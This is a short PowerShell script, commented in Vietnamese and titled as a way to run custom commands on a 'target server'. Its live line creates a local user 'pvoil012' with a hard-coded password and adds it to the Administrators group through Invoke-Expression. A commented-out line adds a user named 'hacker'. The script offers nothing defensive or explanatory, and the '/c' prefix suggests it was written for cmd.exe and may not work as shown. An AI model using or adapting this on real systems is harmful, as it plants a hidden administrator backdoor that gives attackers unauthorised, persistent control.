# Script PowerShell để thực thi các lệnh tùy chỉnh trên máy chủ mục tiêu

# Lệnh PowerShell cần thực hiện
# $command = "net user hacker P@ssw0rd123 /add"  

$command = "/c net user pvoil012 Password123 /add && net localgroup Administrators pvoil012 /add"

# Thực thi lệnh
Invoke-Expression -Command $command